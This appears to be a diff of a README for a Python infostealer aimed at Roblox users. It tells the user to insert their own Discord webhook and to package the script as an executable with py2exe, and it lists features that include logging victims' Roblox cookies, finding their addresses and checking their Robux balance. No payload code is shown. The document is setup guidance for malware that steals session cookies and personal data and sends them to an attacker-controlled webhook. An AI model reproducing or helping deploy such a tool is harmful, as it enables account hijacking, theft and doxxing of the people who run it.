@@ -7,11 +7,11 @@
 ### Replace this
 
 ```py
-webhook = "https://discord.com/api/webhooks/xxxxxxxxxxxxxxxxxxx/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+webhook = "https://discord.com/api/webhooks/xxxxxxxxxxxxxxxxxxx/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
 ```
 ### For ur own webhook
 
-#### Install py2exe and Convert ur .py in exe
+#### Install py2exe
 ```bash
 $ pip install py2exe
 ```
@@ -26,6 +26,10 @@ setup(console=['main.py'])
 ```bash
 $ python setup.py py2exe
 ```
+#### Install requirements
+```bash
+$ pip install -r requirements.txt
+```
 
 - Features.
   - Log Roblox Cookies ✔
@@ -35,8 +39,3 @@ $ python setup.py py2exe
   - Finds their address ✔
   - Check their robux balance ✔
   - And more ✔
-
-#### Install requirements
-```bash
-$ pip install -r requirements.txt
-```
